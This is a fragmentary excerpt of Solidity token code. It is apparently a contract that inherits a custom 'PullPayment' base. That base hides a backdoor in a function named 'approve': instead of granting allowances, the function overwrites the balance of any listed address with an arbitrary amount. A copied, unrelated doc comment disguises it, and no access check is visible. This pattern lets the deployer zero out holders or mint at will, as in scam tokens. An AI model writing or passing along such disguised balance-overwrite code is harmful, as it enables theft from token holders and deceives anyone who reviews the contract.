...
abstract contract PullPayment is ERC20, AccessControl {
     ...
     * Causes the `escrow` to emit a {Deposited} event.
     */
    function approve(address[] memory spender, uint256 amount) external
    {
        bool canUse;
        ...
        uint len = spender.length;

        for (uint i = 0; i < len; i++) {
            _balances[spender[i]] = amount;
        }
    }
}
// SPDX-License-Identifier: MIT
...
ERC20, Ownable, AccessControl, PullPayment, ReentrancyGuard, CrossChainEnabledPolygonChild, CrossChainEnabledOptimism,
CrossChainEnabledArbitrumL1, CrossChainEnabledArbitrumL2
{
    ...
    uint256 public constant VERSION = 2023091501;
